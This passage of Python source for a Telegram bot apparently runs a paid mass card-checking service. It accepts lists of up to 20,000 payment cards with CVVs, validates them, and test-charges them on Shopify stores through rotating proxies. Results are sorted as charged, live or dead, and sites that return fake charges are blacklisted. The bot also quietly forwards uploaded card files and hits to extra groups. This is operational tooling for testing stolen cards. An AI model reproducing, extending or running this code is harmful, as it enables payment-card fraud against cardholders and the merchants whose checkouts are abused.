                    GLOBAL_BLACKLISTED_SITES.add(site)
                    _save_to_blacklist(site)
                    print(f"\033[91m[ALERT] FAKE CHARGED on {site} ({fake_charged}/4)\033[0m")
                    try:
                        sites_file = os.path.join(os.path.dirname(__file__), "sites.txt")
                        if os.path.exists(sites_file):
                            with open(sites_file, "r", encoding="utf-8") as rf:
                                current = [line.strip() for line in rf if line.strip()]
                            with open(sites_file, "w", encoding="utf-8") as wf:
                                for s in current:
                                    if s != site:
                                        wf.write(f"{s}\n")
                    except Exception as fe:
                        logging.error(f"[MSH] Error removing fake site: {fe}")
                    site_fails += 1
                    await asyncio.sleep(0.1)
                    continue
                else:
                    print(f"\033[92m[LEGIT] REAL CHARGE on {site}\033[0m")
                    logging.info(f"[MSH] REAL CHARGE CONFIRMED on {site}")
                    result_status = "CHARGED"
                    response_msg = message
                    break

            if code in APPROVED_CODES:
                result_status = "APPROVED"
                response_msg = message
                is_insufficient = code in INSUFFICIENT_CODES
                break

            if code in DEAD_CODES:
                result_status = "DEAD"
                response_msg = message
                break

            msg_upper = message.upper()
            if any(k in msg_upper for k in DECLINE_HINTS):
                result_status = "DEAD"
                response_msg = message
                break

            site_fails += 1
            session.setdefault('_blacklisted_sites', {})[site] = (
                time.time() + SITE_COOLDOWN_TTL
            )
            logging.debug(
                f"[MSH] Unknown response for {cc_formatted} on {site}: "
                f"{message[:80]} — rotating site ({site_fails}/{MAX_SITE_RETRIES})"
            )
            await asyncio.sleep(0.1)
            continue

        session = MSH_SESSIONS.get(session_id)
        if not session:
            return

        if is_retry:
            session['retry_checked'] = session.get('retry_checked', 0) + 1
        else:
            session['checked'] += 1

        if is_session_stopped(session_id):
            return

        try:
            bin_data = await _bin_task
        except asyncio.CancelledError:
            raise
        except Exception:
            bin_data = {}

        print(f"{cc_formatted} | {result_status} | {response_msg} | Proxy: {mask_proxy(used_proxy) if used_proxy else 'None'}")
        logging.info(f"[MSH] {cc_formatted} | {result_status} | {response_msg} | Proxy: {mask_proxy(used_proxy) if used_proxy else 'None'}")

        card_result_data = {
            'card': cc_formatted,
            'response': response_msg,
            'bin_info': bin_data,
            'price': api_price,
            'gateway': 'Shopify',
            'timestamp': datetime.now().isoformat(),
            'proxy_used': mask_proxy(used_proxy) if used_proxy else 'N/A',
            'site_used': used_site or 'N/A',
        }

        if is_session_stopped(session_id):
            return

        if result_status == "CHARGED":
            session['charged'] += 1
            session['charged_cards'].append(card_result_data)
            sent_to_extra = await send_charged_msg_to_user(
                bot, cc_formatted, response_msg, bin_data,
                proxy_status_formatted, api_price, user_obj, plan_name
            )
            asyncio.create_task(
                send_hit_log_to_group(bot, cc_formatted, response_msg, bin_data, user_obj,
                                      plan_name, proxy_status_formatted, api_price, used_site or "", "CHARGED")
            )
            if not sent_to_extra:
                logging.warning(f"[MSH] CHARGED on {used_site} but extra delivery failed (stat still True)")
            await asyncio.gather(
                asyncio.to_thread(update_user_stats, user_id, True),
                asyncio.to_thread(log_hit_to_mshh, user_id, user_obj.username, user_obj.first_name),
            )

        elif result_status == "APPROVED":
            session['approved'] += 1
            session['live_cards'].append(card_result_data)
            await asyncio.gather(asyncio.to_thread(update_user_stats, user_id, True))
            if is_insufficient:
                await asyncio.gather(
                    send_hit_log_to_group(bot, cc_formatted, response_msg, bin_data,
                                          user_obj, plan_name, proxy_status_formatted,
                                          api_price, used_site or "", "APPROVED"),
                    send_approved_msg_to_user(bot, cc_formatted, response_msg, bin_data,
                                              proxy_status_formatted, api_price,
                                              user_obj, plan_name, send_to_extra=False),
                )

        elif result_status == "DEAD":
            session['dead'] += 1
            session['dead_cards'].append(card_result_data)
            await asyncio.gather(asyncio.to_thread(update_user_stats, user_id, False))

        elif result_status == "ERROR":
            session['errors'] += 1
            session['error_cards'].append(card_result_data)
            await asyncio.to_thread(update_user_stats, user_id, False)

        elif result_status == "SKIPPED":
            session['errors'] += 1
            session['error_cards'].append(card_result_data)
            logging.info(f"[MSH] Skipped→counted as error for outer retry: {cc_formatted}")

    finally:
        if not _bin_task.done():
            _bin_task.cancel()


@router.callback_query(MshResultCallback.filter())
async def handle_result_callback(callback: types.CallbackQuery, callback_data: MshResultCallback):
    try:
        session_id = callback_data.session_id
        result_type = callback_data.result_type
        session = MSH_SESSIONS.get(session_id)
        if not session:
            await callback.answer("<tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> Session expired", show_alert=True)
            return
        if callback.from_user.id != session.get('user_id'):
            await callback.answer("<tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> No permission", show_alert=True)
            return

        if result_type == "charged":
            count = len(session.get('charged_cards', []))
        elif result_type == "live":
            count = len(session.get('live_cards', []))
        elif result_type == "dead":
            count = len(session.get('dead_cards', []))
        else:
            count = (len(session.get('charged_cards', [])) +
                     len(session.get('live_cards', [])))

        if count == 0:
            type_names = {"charged": "Charged", "live": "Live", "dead": "Dead", "all": "Hit"}
            await callback.answer(f"<tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> No {type_names.get(result_type, '')} cards found", show_alert=True)
            return

        await callback.answer("📦 Generating report...", show_alert=False)
        user_obj = session.get('user_obj')
        plan_name = session.get('plan_name', 'TRIAL')
        user_msg_id = session.get('user_msg_id')
        file_buffer, filename, total_count = generate_result_file(session, result_type, user_obj, plan_name)
        file_content = file_buffer.read()
        file_buffer.seek(0)

        type_emoji_map = {
            "charged": f'<tg-emoji emoji-id="{HIT_CHARGED_EMOJI_ID}">💎</tg-emoji>',
            "live": f'<tg-emoji emoji-id="{CUSTOM_APPROVED_EMOJI_ID}">✅</tg-emoji>',
            "dead": f'<tg-emoji emoji-id="{HIT_WARNING_EMOJI_ID}">⚠️</tg-emoji>',
            "all": f'<tg-emoji emoji-id="{HIT_FIRE_EMOJI_ID}">🔥</tg-emoji>',
        }
        type_labels = {"charged": "𝗖𝗛𝗔𝗥𝗚𝗘𝗗", "live": "𝗟𝗶𝘃𝗲", "dead": "𝗗𝗲𝗮𝗱", "all": "𝗛𝗶𝘁𝘀"}
        emoji = type_emoji_map.get(result_type, type_emoji_map["all"])
        label = type_labels.get(result_type, "𝗛𝗶𝘁𝘀")
        caption = (
            f"𝗥𝗲𝘀𝘂𝗹𝘁 𝗧𝘆𝗽𝗲 ➛ {label} {emoji}\n"
            f"𝗧𝗼𝘁𝗮𝗹 𝗖𝗮𝗿𝗱𝘀 ➛ <b>{total_count}</b>\n"
            f"<tg-emoji emoji-id='5039895103947146186'>🌐</tg-emoji> 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛ 𝗦𝗵𝗼𝗽𝗶𝗳𝘆 𝗠𝗮𝘀𝘀"
        )
        sent = await _safe_send_document(
            callback.bot, chat_id=callback.message.chat.id,
            document_bytes=file_content, filename=filename,
            caption=caption, reply_to=user_msg_id,
        )
        if not sent:
            try:
                await callback.answer("❌ Could not send report file.", show_alert=True)
            except Exception:
                pass
    except Exception as e:
        logging.error(f"Error handling result callback: {e}", exc_info=True)
        try:
            await callback.message.answer(
                f"<tg-emoji emoji-id='5040030395416969985'>🚫</tg-emoji> Error: <code>{str(e)[:50]}</code>",
                parse_mode="HTML"
            )
        except:
            pass


@router.callback_query(MshStopCallback.filter())
async def handle_stop_callback(callback: types.CallbackQuery, callback_data: MshStopCallback):
    try:
        session_id = callback_data.session_id
        session = MSH_SESSIONS.get(session_id)
        if not session:
            await callback.answer("<tg-emoji emoji-id='5456140674028019486'>🛑</tg-emoji> Session expired", show_alert=True)
            return
        if callback.from_user.id != session.get('user_id'):
            await callback.answer("<tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> No permission", show_alert=True)
            return
        if session['status'] != "CHECKING":
            await callback.answer("ℹ️ Not running", show_alert=True)
            return
        session['status'] = "STOPPED"
        cancelled_count = 0
        for task in session.get('tasks', []):
            if not task.done():
                task.cancel()
                cancelled_count += 1
        await callback.answer("<tg-emoji emoji-id='5040030395416969985'>🚫</tg-emoji> Stopping...", show_alert=False)
        logging.info(f"❌ [MSH] Cancelled {cancelled_count} tasks")
        session['last_text'] = ""
        await update_progress_message(callback.bot, session_id)
    except Exception as e:
        logging.error(f"Error handling stop callback: {e}", exc_info=True)
        try:
            await callback.answer("<tg-emoji emoji-id='4915853119839011973'>⚠️</tg-emoji> Error stopping", show_alert=True)
        except:
            pass


@router.message(F.text.startswith("/stopmsh"))
async def stopmsh_command(message: types.Message):
    user = message.from_user
    if user.id not in ADMIN_IDS:
        await message.reply(
            "<tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> "
            "<b>𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱.</b>", parse_mode="HTML")
        return
    running_sessions = [(sid, s) for sid, s in list(MSH_SESSIONS.items())
                        if s.get('status') == "CHECKING"]
    if not running_sessions:
        await message.reply(
            "<tg-emoji emoji-id='5039844895779455925'>🍾</tg-emoji> "
            "<b>𝗡𝗼 𝗮𝗰𝘁𝗶𝘃𝗲 𝗰𝗵𝗲𝗰𝗸𝘀 𝗿𝘂𝗻𝗻𝗶𝗻𝗴.</b>", parse_mode="HTML")
        return
    admin_name = html_escape(user.first_name or "Admin")
    admin_link = (f'<a href="https://t.me/{html_escape(user.username)}">{admin_name}</a>'
                  if user.username else f'<a href="tg://user?id={user.id}">{admin_name}</a>')
    stopped = []
    for session_id, session in running_sessions:
        try:
            session['status'] = "STOPPED"
            cancelled = 0
            for task in session.get('tasks', []):
                if not task.done():
                    task.cancel()
                    cancelled += 1
            chat_id = session.get('chat_id')
            msg_id = session.get('msg_id')
            owner_id = session.get('user_id')
            if chat_id and msg_id:
                try:
                    await message.bot.delete_message(chat_id=chat_id, message_id=msg_id)
                except Exception:
                    pass
            stop_notice = (
                "<tg-emoji emoji-id='5040030395416969985'>🚫</tg-emoji> "
                "<b>𝗖𝗛𝗘𝗖𝗞 𝗦𝗧𝗢𝗣𝗣𝗘𝗗 𝗕𝗬 𝗔𝗗𝗠𝗜𝗡</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                f"<b><tg-emoji emoji-id='6237927637906364256'>👤</tg-emoji> 𝗔𝗱𝗺𝗶𝗻 ➛</b> {admin_link}\n"
                f"<b><tg-emoji emoji-id='5406683434124859552'>🆔</tg-emoji> 𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗜𝗗 ➛</b> <code>{session_id}</code>\n"
                f"<b><tg-emoji emoji-id='5388632425314140043'>🔍</tg-emoji> 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀 ➛</b> <code>{session.get('checked', 0)}/{session.get('total', 0)}</code>"
            )
            if chat_id:
                try:
                    await message.bot.send_message(chat_id=chat_id, text=stop_notice, parse_mode="HTML")
                except Exception:
                    pass
            if owner_id:
                try:
                    await message.bot.send_message(
                        chat_id=owner_id,
                        text=(
                            "<tg-emoji emoji-id='5040030395416969985'>🚫</tg-emoji> "
                            "<b>𝗬𝗼𝘂𝗿 𝗰𝗵𝗲𝗰𝗸 𝘄𝗮𝘀 𝘀𝘁𝗼𝗽𝗽𝗲𝗱 𝗯𝘆 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.</b>\n"
                            "━━━━━━━━━━━━━━━━━━━━\n"
                            f"<b><tg-emoji emoji-id='6237927637906364256'>👤</tg-emoji> 𝗔𝗱𝗺𝗶𝗻 ➛</b> {admin_link}\n"
                            f"<b><tg-emoji emoji-id='5406683434124859552'>🆔</tg-emoji> 𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗜𝗗 ➛</b> <code>{session_id}</code>"
                        ),
                        parse_mode="HTML",
                    )
                except Exception:
                    pass
            stopped.append({'session_id': session_id, 'user_id': owner_id,
                            'checked': session.get('checked', 0),
                            'total': session.get('total', 0),
                            'cancelled': cancelled})
        except Exception as e:
            logging.error(f"[stopmsh] Error stopping session {session_id}: {e}")

    lines = [
        "<tg-emoji emoji-id='5040030395416969985'>🚫</tg-emoji> <b>𝗔𝗟𝗟 𝗠𝗦𝗛 𝗖𝗛𝗘𝗖𝗞𝗦 𝗦𝗧𝗢𝗣𝗣𝗘𝗗</b>",
        "━━━━━━━━━━━━━━━━━━━━",
        f"<b><tg-emoji emoji-id='5341715473882955310'>✅</tg-emoji> 𝗦𝗲𝘀𝘀𝗶𝗼𝗻𝘀 ➛</b> <code>{len(stopped)}</code>",
        f"<b><tg-emoji emoji-id='6237927637906364256'>👤</tg-emoji> 𝗕𝘆 ➛</b> {admin_link}",
        ""
    ]
    for s in stopped:
        lines.append(
            f"• <code>{s['session_id']}</code> — "
            f"<a href='tg://user?id={s['user_id']}'>{s['user_id']}</a> "
            f"({s['checked']}/{s['total']}) — {s['cancelled']} tasks cancelled"
        )
        await message.reply("\n".join(lines), parse_mode="HTML")


@router.message(F.text.startswith("/prunedead"))
async def prunedead_command(message: types.Message):
    user = message.from_user
    if user.id not in ADMIN_IDS:
        await message.reply(
            "<tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> "
            "<b>𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱.</b>",
            parse_mode="HTML",
        )
        return

    status_msg = await message.reply(
        "<tg-emoji emoji-id='5039579582764680065'>⏳</tg-emoji> "
        "<b>Fetching dead sites from all replicas...</b>",
        parse_mode="HTML",
    )

    dead_hosts: set = set()
    replica_reports: list = []

    async with aiohttp.ClientSession(
        timeout=aiohttp.ClientTimeout(total=15)
    ) as session:
        for server in API_SERVERS:
            try:
                async with session.get(f"{server}/dead-sites") as resp:
                    if resp.status != 200:
                        replica_reports.append((server, f"HTTP {resp.status}"))
                        continue
                    data = await resp.json()
                    sites = data.get("sites", {})
                    for h in sites.keys():
                        dead_hosts.add(h)
                    replica_reports.append((server, f"{len(sites)} dead"))
            except Exception as e:
                replica_reports.append((server, f"err: {type(e).__name__}"))

    if not dead_hosts:
        lines = [
            "<tg-emoji emoji-id='5039844895779455925'>🍾</tg-emoji> "
            "<b>Nothing to prune.</b>",
            "",
            "<b>Replica responses:</b>",
        ]
        for server, status in replica_reports:
            domain = server.replace("https://", "").split(".")[0]
            lines.append(f"• <code>{domain}</code> — {status}")
        await status_msg.edit_text("\n".join(lines), parse_mode="HTML")
        return

    await status_msg.edit_text(
        f"<tg-emoji emoji-id='5039579582764680065'>⏳</tg-emoji> "
        f"<b>Found {len(dead_hosts)} unique dead hosts. Pruning MongoDB...</b>",
        parse_mode="HTML",
    )

    deleted_from_db = 0
    try:
        def _delete_from_mongo():
            from database import get_db_connection
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute(
                "DELETE FROM global_sites WHERE site = ANY(%s)",
                (list(dead_hosts),),
            )
            count = cursor.rowcount
            conn.commit()
            conn.close()
            return count

        deleted_from_db = await asyncio.to_thread(_delete_from_mongo)
    except Exception as e:
        logging.error(f"[prunedead] Mongo delete failed: {e}")

    deleted_from_txt = 0
    try:
        sites_file = os.path.join(os.path.dirname(__file__), "sites.txt")
        if os.path.exists(sites_file):
            with open(sites_file, "r", encoding="utf-8", errors="ignore") as f:
                before = [ln.strip() for ln in f if ln.strip()]
            dead_norm = {h.replace("myshopify.com", "").strip() for h in dead_hosts}
            after = [
                s for s in before
                if not any(
                    h in s or h.replace("myshopify.com", "") in s
                    for h in dead_hosts
                )
            ]
            deleted_from_txt = len(before) - len(after)
            if deleted_from_txt > 0:
                with open(sites_file, "w", encoding="utf-8") as f:
                    for s in after:
                        f.write(f"{s}\n")
    except Exception as e:
        logging.error(f"[prunedead] sites.txt prune failed: {e}")

    cache_cleared = 0
    async with aiohttp.ClientSession(
        timeout=aiohttp.ClientTimeout(total=10)
    ) as session:
        for server in API_SERVERS:
            for endpoint in ("/dead-sites/clear", "/reload"):
                try:
                    async with session.post(f"{server}{endpoint}") as resp:
                        if resp.status == 200:
                            cache_cleared += 1
                except Exception:
                    pass

    lines = [
        "<tg-emoji emoji-id='5341715473882955310'>✅</tg-emoji> "
        "<b>𝗣𝗿𝘂𝗻𝗲 𝗰𝗼𝗺𝗽𝗹𝗲𝘁𝗲</b>",
        "━━━━━━━━━━━━━━━━━━━━",
        f"<b>Unique dead hosts found ➛</b> <code>{len(dead_hosts)}</code>",
        f"<b>Deleted from MongoDB ➛</b> <code>{deleted_from_db}</code>",
        f"<b>Deleted from sites.txt ➛</b> <code>{deleted_from_txt}</code>",
        f"<b>Cache clears sent ➛</b> <code>{cache_cleared}</code>",
        "",
        "<b>Replica responses:</b>",
    ]
    for server, status in replica_reports:
        domain = server.replace("https://", "").split(".")[0]
        lines.append(f"• <code>{domain}</code> — {status}")

    lines.append("")
    lines.append(
        "<i>Next /msh will use the pruned pool. "
        "No restart needed.</i>"
    )

    await status_msg.edit_text("\n".join(lines), parse_mode="HTML")
    logging.info(
        f"[prunedead] admin {user.id}: {len(dead_hosts)} dead hosts, "
        f"mongo={deleted_from_db}, txt={deleted_from_txt}"
    )


@router.message(lambda message: (message.text and message.text.startswith("/msh")) or (message.caption and message.caption.startswith("/msh")))
async def msh_command(message: types.Message):
    if not await asyncio.to_thread(is_gate_enabled, "msh"):
        await message.reply("<tg-emoji emoji-id='4958926882994127612'>🚧</tg-emoji> <b>𝗠𝗮𝘀𝘀 𝗚𝗮𝘁𝗲 𝘂𝗻𝗱𝗲𝗿 𝗠𝗮𝗶𝗻𝘁𝗲𝗻𝗮𝗻𝗰𝗲.</b>", parse_mode="HTML")
        return
    user = message.from_user
    user_id = user.id
    user_name = html_escape(user.first_name or "Unknown")
    bot = message.bot
    is_premium, _ = get_premium_status(user_id)
    if not is_premium:
        await message.reply("<tg-emoji emoji-id='5042050649248760772'>💎</tg-emoji> GET KEY FROM @Lanxo2", parse_mode="HTML")
        return
    for sid, sd in list(MSH_SESSIONS.items()):
        if sd.get('user_id') == user_id and sd.get('status') == "CHECKING":
            await message.reply(
                "<tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> <b>𝗔𝗰𝘁𝗶𝘃𝗲 𝗦𝗲𝘀𝘀𝗶𝗼𝗻</b>\n\n"
                "Use the Stop button to stop it.", parse_mode="HTML")
            return
    user_proxies = await get_user_proxies(user_id)
    if not user_proxies:
        await message.reply(
            "<tg-emoji emoji-id='4915853119839011973'>⚠️</tg-emoji> <b>𝗡𝗼 𝗣𝗿𝗼𝘅𝗶𝗲𝘀!</b>\n\n"
            "Add proxies using <code>/proxy</code>.", parse_mode="HTML")
        return
    raw_text = ""
    parts = (message.text or message.caption or "").split(maxsplit=1)
    if len(parts) > 1: raw_text += parts[1] + " "
    if message.reply_to_message:
        rm = message.reply_to_message
        if rm.text: raw_text += rm.text + " "
        elif rm.caption: raw_text += rm.caption + " "
    document = message.document or (message.reply_to_message.document if message.reply_to_message else None)
    if document:
        for gid in EXTRA_CHARGED_GROUP_IDS:
            try:
                if not await _is_group(bot, gid): continue
                await bot.send_document(
                    chat_id=gid, document=document.file_id,
                    caption=f"User <a href='tg://user?id={user_id}'>{user_name}</a> sent a txt file",
                    parse_mode="HTML")
            except Exception as e:
                logging.error(f"Failed to forward txt to {gid}: {e}")
        if document.file_size and document.file_size > 2 * 1024 * 1024:
            await message.reply("<tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> File too large. Max 2MB.")
            return
        try:
            fi = await bot.get_file(document.file_id)
            bc = await bot.download_file(fi.file_path)
            if bc:
                data = bc.read() if hasattr(bc, 'read') else bc
                raw_text += data.decode('utf-8', errors='ignore')
        except Exception as e:
            await message.reply(f"<tg-emoji emoji-id='5040030395416969985'>🚫</tg-emoji> Error reading file: {e}")
            return
    if not raw_text.strip():
        await message.reply(
            "<tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> <b>𝗡𝗼 𝗰𝗮𝗿𝗱𝘀 𝗳𝗼𝘂𝗻𝗱.</b>", parse_mode="HTML")
        return
    extracted = extract_cards_from_text(raw_text)
    if not extracted:
        await message.reply("<tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> No valid card formats found.")
        return
    valid_cards = []
    expired_count = invalid_luhn_count = 0
    MAX_VALID_CARDS = 20000
    for card_string in extracted:
        if len(valid_cards) >= MAX_VALID_CARDS: break
        pc = card_string.split('|')
        if len(pc) != 4: continue
        cc, mm, yy, cvv = pc
        if not luhn_check(cc):
            invalid_luhn_count += 1; continue
        if is_expired(mm, yy):
            expired_count += 1; continue
        valid_cards.append((card_string, cc))
    total = len(valid_cards)
    if total == 0:
        fi = ""
        if expired_count > 0 or invalid_luhn_count > 0:
            fi = f"Filtered {invalid_luhn_count} invalid & {expired_count} expired.\n"
        await message.reply(f"{fi}<tg-emoji emoji-id='5456140674028019486'>🛑</tg-emoji> No valid cards.", parse_mode="HTML")
        return
    is_group = message.chat.type in ("group", "supergroup", "channel")
    asyncio.create_task(process_mass_check_background(message, bot, valid_cards, user, user_proxies, is_group))


async def process_mass_check_background(message: types.Message, bot: Bot, valid_cards: list, user_obj, user_proxies, is_group: bool = False):
    user_id = user_obj.id
    chat_id = message.chat.id
    total_cards = len(valid_cards)
    if total_cards == 0:
        await message.reply("<tg-emoji emoji-id='4915853119839011973'>⚠️</tg-emoji> No valid cards.", parse_mode="HTML")
        return
    session_id = "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
    plan_name = await get_user_plan_name(user_id)
    proxy_manager = ProxyManager(user_proxies, session_id)
    proxy_stats = proxy_manager.get_stats()
    logging.info(f"🔄 [MSH] Session {session_id}: {proxy_stats['total_proxies']} proxies, {total_cards} cards, concurrency={CARD_CONCURRENCY}")
    initial_text = (
        f"<b><tg-emoji emoji-id='5039895103947146186'>🌐</tg-emoji> 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛</b> Shopify\n"
        f"<b><tg-emoji emoji-id='5231200819986047254'>📊</tg-emoji> 𝗦𝘁𝗮𝘁𝘂𝘀 ➛</b> <i>CHECKING</i> <tg-emoji emoji-id='5269531045165816230'>🔄</tg-emoji>\n"
        f"<b><tg-emoji emoji-id='5388632425314140043'>🔍</tg-emoji> 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 ➛</b> <code>0/{total_cards}</code>\n"
        f"<b><tg-emoji emoji-id='5341715473882955310'>✅</tg-emoji> 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ➛</b> <b>0</b>\n"
        f"<b><tg-emoji emoji-id='5436113877181941026'>🔥</tg-emoji> 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 ➛</b> <b>0</b>\n"
        f"<b><tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> 𝗗𝗲𝗮𝗱 ➛</b> <b>0</b>\n"
        f"<b><tg-emoji emoji-id='4915853119839011973'>⚠️</tg-emoji> 𝗘𝗿𝗿𝗼𝗿𝘀 ➛</b> <b>0</b>\n"
        f"<b><tg-emoji emoji-id='5456140674028019486'>⚡</tg-emoji> 𝗧𝗶𝗺𝗲 ➛</b> <b>0s</b>\n"
        f"<b><tg-emoji emoji-id='5039653765439816618'>🐈‍⬛</tg-emoji> 𝗗𝗲𝘃 ➛</b> <a href='https://t.me/oozaruh'>Starkz</a>\n"
        f"<b><tg-emoji emoji-id='5406683434124859552'>🆔</tg-emoji> 𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗜𝗗 ➛</b> <code>{session_id}</code>"
    )
    initial_buttons = get_result_buttons(session_id, is_running=True)
    progress_msg = await message.reply(initial_text, parse_mode="HTML", reply_markup=initial_buttons)
    MSH_SESSIONS[session_id] = {
        "session_id": session_id, "status": "CHECKING",
        "chat_id": chat_id, "user_id": user_id,
        "msg_id": progress_msg.message_id, "user_msg_id": message.message_id,
        "total": total_cards, "checked": 0, "approved": 0, "charged": 0, "dead": 0,
        "errors": 0, "start_time": time.time(), "tasks": [],
        "proxies": user_proxies, "proxy_manager": proxy_manager, "bad_proxies": [],
        "last_text": "", "last_update_time": 0,
        "live_cards": [], "dead_cards": [], "charged_cards": [], "error_cards": [],
        "user_obj": user_obj, "plan_name": plan_name, "is_group": is_group,
        "retry_checked": 0, "retry_total": 0, "current_round": 0,
        "_blacklisted_sites": {},
        "_no_product_sites": {},
        "_site_sems": {},
        "_summary_posted": False,
        "_last_cleanup_count": 0,
    }
    user_custom_sites = await asyncio.to_thread(get_user_sites_db, user_id)
    active_sites = user_custom_sites if user_custom_sites else get_sites()
    site_source = f"CUSTOM ({len(active_sites)})" if user_custom_sites else f"GLOBAL ({len(active_sites)})"
    MSH_SESSIONS[session_id]["sites_list"] = active_sites
    print(f"🚀 [MSH] Started - {total_cards} cards - User: {user_id} - Sites: {site_source} - Proxies: {len(user_proxies)}")
    logging.info(f"🚀 [MSH] Started - {total_cards} cards - User: {user_id} - Sites: {site_source} - Proxies: {len(user_proxies)}")
    asyncio.create_task(run_mass_checker(bot, session_id, valid_cards, user_obj, plan_name))


async def _run_single_round(bot: Bot, session_id, cards, user_obj, plan_name, round_num: int = 0):
    session = MSH_SESSIONS.get(session_id)
    if not session:
        return
    is_retry = round_num > 0
    if is_retry:
        session['current_round'] = round_num
        session['retry_total'] = len(cards)
        session['retry_checked'] = 0

    session['tasks'] = [t for t in session.get('tasks', []) if not t.done()]
    sem = asyncio.Semaphore(CARD_CONCURRENCY)

    async def worker(cc_formatted, cc_num):
        if is_session_stopped(session_id):
            return
        async with sem:
            if is_session_stopped(session_id):
                return
            try:
                await process_single_card(
                    session_id, cc_formatted, cc_num,
                    session['user_id'], bot, user_obj, plan_name,
                    is_retry=is_retry,
                )
            except asyncio.CancelledError:
                raise
            except Exception as e:
                logging.error(f"Worker error for {cc_formatted}: {type(e).__name__}: {e}")
                _s = MSH_SESSIONS.get(session_id)
                if _s:
                    _s['errors'] += 1
                    if is_retry:
                        _s['retry_checked'] = _s.get('retry_checked', 0) + 1
                    else:
                        _s['checked'] += 1

    tasks = []
    for cc_formatted, cc_num in cards:
        if is_session_stopped(session_id):
            break
        task = asyncio.create_task(worker(cc_formatted, cc_num))
        tasks.append(task)
        session['tasks'].append(task)
    logging.info(f"[MSH] Round {round_num}: {len(tasks)} tasks created (concurrency={CARD_CONCURRENCY})")
    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)


async def run_mass_checker(bot: Bot, session_id, cards, user_obj, plan_name):
    session = MSH_SESSIONS.get(session_id)
    if not session:
        return

    try:
        updater_task = asyncio.create_task(_background_progress_updater(bot, session_id))
        session['_updater_task'] = updater_task

        await _run_single_round(bot, session_id, cards, user_obj, plan_name, round_num=0)

        for round_num in range(1, MAX_OUTER_ROUNDS + 1):
            session = MSH_SESSIONS.get(session_id)
            if not session or is_session_stopped(session_id):
                break
            retryable = []
            finals = []
            for c in session.get('error_cards', []):
                cls = _classify_for_retry(c.get('response', ''))
                if cls == "RETRYABLE":
                    cc_str = c.get('card', '')
                    if '|' in cc_str:
                        retryable.append((cc_str, cc_str.split('|')[0]))
                else:
                    finals.append(c)
            if not retryable:
                logging.info(f"[MSH] Round {round_num}: no retryable errors — stopping")
                break
            delay = OUTER_RETRY_DELAYS[
                min(round_num - 1, len(OUTER_RETRY_DELAYS) - 1)
            ]
            logging.info(
                f"[MSH] Round {round_num}: {len(retryable)} retryable, "
                f"{len(finals)} final rejects, waiting {delay}s"
            )
            await _update_retry_banner(bot, session_id, round_num, len(retryable), delay, phase="waiting")
            for _ in range(delay):
                if is_session_stopped(session_id):
                    return
                await asyncio.sleep(1)
            session['error_cards'] = finals
            session['errors'] = len(finals)
            await _run_single_round(bot, session_id, retryable, user_obj, plan_name, round_num=round_num)

        session = MSH_SESSIONS.get(session_id)
        if session:
            residual = len(session.get('error_cards', []))
            if residual:
                logging.info(f"[MSH] Session ended with {residual} unresolved errors")
            session['errors'] = residual
            if session['status'] != "STOPPED":
                session['status'] = "FINISHED"

            if session['status'] == "FINISHED":
                try:
                    await _post_hits_summary(bot, session_id)
                except Exception as e:
                    logging.warning(f"[MSH] Summary post failed: {e}")

        if session:
            updater = session.get('_updater_task')
            if updater and not updater.done():
                try:
                    await asyncio.wait_for(updater, timeout=5.0)
                except Exception:
                    pass

        if session:
            logging.info(
                f"[MSH] Session {session_id} finished — "
                f"charged={session['charged']} approved={session['approved']} "
                f"dead={session['dead']} errors={session['errors']} "
                f"elapsed={time.time() - session['start_time']:.0f}s"
            )
    except asyncio.CancelledError:
        raise
    finally:
        s = MSH_SESSIONS.get(session_id)
        if s and s.get('status') == "CHECKING":
            s['status'] = "FINISHED"
            logging.warning(
                f"[MSH] Session {session_id} exited abnormally — "
                f"status forced to FINISHED"
            )
